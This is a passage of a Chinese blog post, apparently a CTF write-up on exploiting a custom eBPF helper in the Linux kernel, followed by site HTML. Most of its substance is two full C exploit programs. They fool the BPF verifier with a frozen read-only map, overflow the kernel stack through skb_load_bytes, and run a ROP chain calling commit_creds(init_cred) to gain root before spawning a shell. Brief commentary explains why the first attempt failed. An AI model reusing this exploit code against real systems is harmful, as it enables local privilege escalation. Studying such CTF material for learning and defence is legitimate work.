class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, ((<span class="keyword">sizeof</span>(ropchain)+<span class="number">8</span>)^<span class="number">2025</span>)),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_10), </span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_1,<span class="number">-8</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_2,<span class="number">8</span>),    </span><br><span class="line">        BPF_MOV64_REG(BPF_REG_3, BPF_REG_7),</span><br><span class="line">        BPF_EMIT_CALL(BPF_FUNC_aliyunctf_xor),</span><br><span class="line"></span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),     </span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),              </span><br><span class="line">        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),    </span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -<span class="keyword">sizeof</span>(ropchain)),</span><br><span class="line">        BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_9),   </span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_4, <span class="keyword">sizeof</span>(ropchain)), </span><br><span class="line">        BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes), </span><br><span class="line">    </span><br><span class="line">        BPF_EXIT_INSN(),  </span><br><span class="line">    </span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="type">int</span> progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">                                insns, <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">                                <span class="string">"GPL v2"</span>);</span><br><span class="line">    <span class="keyword">if</span> (progfd == <span class="number">-1</span>) {</span><br><span class="line">        loge(<span class="string">"bpf(BPF_PROG_LOAD):%s"</span>,bpf_log_buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    err = bpf_prog_skb_run(progfd, ropchain, <span class="keyword">sizeof</span>(ropchain));</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对比root(上图)和普通用户(下图)生成的机器码, 最担心的情况还是发生了. 其实在最开始分析利用方法的时候我就在思考这样一个场景, 既然verifier已经能确定从只读map中读出的数据值, 那为什么不直接在jitcode中进行常量优化呢?  下图中,offset直接使用了r10的零值, 而不是从map中读取到的r15值. (<del>为啥只在普通用户下有这个优化……</del>)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20250412202723.png"></p>
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20250412203154.png"></p>
+<h3 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h3><p>笔者尝试思考一种无法进行常量优化的场景, 但这似乎与欺骗verifier的前提矛盾, 无果.<br>无奈之下, 尝试用改写size的方式替代改写offset的方式来碰碰运气.</p>
+<p>然后, 它成了……(不理解, 看看之后有没有时间研究一下).</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> map_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">initMap</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="type">int</span>), <span class="keyword">sizeof</span>(<span class="type">int64_t</span>), <span class="number">1</span>, BPF_F_RDONLY_PROG);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> value = <span class="number">8</span>;</span><br><span class="line">    bpf_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> err = bpf_map_freeze(map_fd);</span><br><span class="line">    <span class="keyword">if</span>(err == <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        loge(<span class="string">"bpf(BPF_MAP_FREEZE):%s"</span>,bpf_log_buf);</span><br><span class="line">        err_exit(<span class="string">"BPF_MAP_FREEZE"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c1c60</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a52fa0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c19b0</span>;</span><br><span class="line"><span class="type">size_t</span> do_sys_vfork = <span class="number">0xffffffff8108d2f0</span>;</span><br><span class="line"><span class="type">size_t</span> msleep = <span class="number">0xffffffff8113dfd0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff81142d79</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_FUNC_aliyunctf_xor 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RETADDR_OFFSET 0x28</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    initMap();</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> ropchain[] = {</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        pop_rdi,</span><br><span class="line">        init_cred,</span><br><span class="line">        commit_creds,</span><br><span class="line">        do_sys_vfork</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> {</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0xdeadbeef</span>),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// reg9: size</span></span><br><span class="line">        <span class="comment">// reg6: map_fd</span></span><br><span class="line">        <span class="comment">// reg8: skb</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_6, map_fd),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_2,<span class="number">-8</span>),</span><br><span class="line">        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_7,BPF_REG_0),</span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, ((<span class="keyword">sizeof</span>(ropchain))^<span class="number">2025</span>)), </span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_10), </span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_1,<span class="number">-8</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_2,<span class="number">8</span>),    </span><br><span class="line">        BPF_MOV64_REG(BPF_REG_3, BPF_REG_7),</span><br><span class="line">        BPF_EMIT_CALL(BPF_FUNC_aliyunctf_xor),</span><br><span class="line"></span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_8), </span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),          </span><br><span class="line">        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10), </span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), </span><br><span class="line">        BPF_MOV64_REG(BPF_REG_4, BPF_REG_9),</span><br><span class="line">        BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes), </span><br><span class="line">    </span><br><span class="line">        BPF_EXIT_INSN(), </span><br><span class="line">    </span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="type">int</span> progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">                                insns, <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">                                <span class="string">"GPL v2"</span>);</span><br><span class="line">    <span class="keyword">if</span> (progfd == <span class="number">-1</span>) {</span><br><span class="line">        loge(<span class="string">"bpf(BPF_PROG_LOAD):%s"</span>,bpf_log_buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    err = bpf_prog_skb_run(progfd, ropchain, <span class="keyword">sizeof</span>(ropchain));</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2025/Dig%20into%20ebpf(1)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ebpf/" rel="tag">ebpf</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2024/Dig%20into%20Netfilter%20(5)/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Dig into Netfilter (五) —— CVE-2022-32250</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2025
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
